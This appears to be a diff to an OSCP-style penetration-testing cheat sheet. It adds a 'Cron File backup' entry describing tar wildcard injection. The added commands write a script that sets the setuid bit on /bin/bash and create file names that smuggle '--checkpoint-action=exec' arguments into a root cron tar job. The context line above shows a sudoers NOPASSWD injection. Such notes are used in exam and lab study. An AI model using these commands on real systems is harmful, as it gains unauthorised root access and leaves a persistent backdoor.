@@ -95,6 +95,7 @@
     - [/etc/passwd](#etcpasswd)
     - [sudoer](#sudoer)
     - [Kernel Ecpliot](#kernel-ecpliot)
+    - [Cron File backup](#cron-file-backup)
 - [Transfer](#transfer)
   - [Port Forwading](#port-forwading)
     - [SSH](#ssh)
@@ -1172,6 +1173,14 @@ echo username ALL=(ALL) NOPASSWD: ALL >> c:$LFILE
 wget https://github.com/schecthellraiser606/oscp_cheet/raw/main/Dockerfile
 docker build -t vuln .
 docker run -v /root/work/:/work -it vuln /bin/bash
+```
+
+### Cron File backup
+```bash
+echo 'chmod +s /bin/bash' >root.sh
+chmod +x root.sh
+touch '/var/www/html/--checkpoint=1'
+touch '/var/www/html/--checkpoint-action=exec=bash root.sh'
 ```
 
 # Transfer
